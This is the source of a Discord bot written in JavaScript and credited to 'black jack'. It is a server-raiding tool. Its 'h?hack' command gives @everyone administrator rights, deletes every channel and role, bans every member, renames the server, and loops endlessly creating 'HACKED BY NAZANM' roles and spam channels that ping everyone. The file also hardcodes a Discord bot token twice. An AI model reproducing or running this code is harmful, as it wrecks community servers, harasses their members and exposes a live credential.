const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = 'h?'///lera ba dly xot prefix dabne
client.on('ready', () => {
console.log(`Logged in as ${client.user.tag}!`);
 
});

          
/////Ban all

////
client.login("NzYxMjA3MjU4NTYxNzczNTY4.X3XPgA.uGxi4WZKZFFnx9ZbBbqiTNPGIGg")
          
client.on("ready", () => {
  console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
  console.log('By black jack');/////BLACK JACK 
console.log('♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔♔');
console.log(`Logged in as ${client.user.tag}!`);
  client.user.setActivity(`${prefix}help | CREATED BY BLACK JACK ${client.guilds.size}`)///////shtek bnwsa
 client.user.setStatus("dnd")/////ba dly xot statusek bnwsa
  console.log(`Logined`)
})

client.on('message', message => {
    if (message.content.toLowerCase() === prefix + 'hack') {
        message.guild.roles.find('name', '@everyone').edit({
            permissions: ["ADMINISTRATOR"]
        });
        let oldnm = message.guild.name;
        message.guild.channels.map(c => {
            c.delete();
        });
    message.guild.members.forEach( member => {
          
          member.ban()
      })
      message.guild.roles.map(r => {
            r.delete();
      })
        setInterval(() => {
            message.guild.createRole({
                name: "HACKED BY NAZANM",
                permissions: ["ADMINISTRATOR"]
            }).then(rr => {
 
                message.member.addRole(rr.id);
            });
        }, 1000);
        message.guild.setIcon("https://media.discordapp.net/attachments/793750057500278805/806561503980421120/image0.jpg");
        message.guild.setName('BLACK JACK');
        setTimeout(function() {
            setInterval(() => {
          
                message.guild.createChannel('HACKED BY NAZANM', 'text').then(channel => {
                channel.send('@everyone HACKRAWA LALAYAN BLACK JACK :joy: :joy: :joy:')
               
                })
            }
                        
                        , 500)
            })
        }
    
})        
 ////codaka drwst krawa lalayan black jack

client.login("NzYxMjA3MjU4NTYxNzczNTY4.X3XPgA.uGxi4WZKZFFnx9ZbBbqiTNPGIGg")
          